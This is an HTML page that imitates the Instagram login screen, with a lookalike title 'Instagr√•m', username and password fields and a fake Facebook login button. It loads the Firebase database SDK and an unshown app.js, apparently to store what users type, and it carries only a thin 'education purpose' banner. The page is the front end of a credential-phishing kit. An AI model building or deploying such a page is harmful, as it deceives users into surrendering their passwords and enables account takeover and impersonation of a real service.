<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagr√•m</title>
  <link rel="icon" type="image/png" href="pic2.png">
  <link rel="stylesheet" type="text/css" href="style.css">
  <!-- Include the Firebase JavaScript SDK -->
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
</head>
<body>
  <div class="test-site-banner">
    This website created for education purpose
</div>
<div class="container">
<div class="box">
    <div class="heading"></div>
    <form class="login-form" id="login-form">
        <div class="field">
            <input id="username" type="text" placeholder="Phone number, username, or email" required/>
            <label for="username">Phone number, username, or email</label>
        </div>
        <div class="field">
            <input id="password" type="password" placeholder="password" required />
            <label for="password">Password</label>
        </div>
        <button type="submit" class="login-button" title="login">Log In</button>
        <div class="separator">
            <div class="line"></div>
            <p>OR</p>
            <div class="line"></div>
        </div>
        <div class="other">
            <button class="fb-login-btn" type="button">
                <i class="fa fa-facebook-official fb-icon"></i>
                <span class="">Log in with Facebook</span>
            </button>
            <a class="forgot-password" href="#">Forgot password?</a>
        </div>
    </form>
</div>
<div class="box">
    <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
</div>
</div>
<script src="app.js"></script>
</body>
</html>
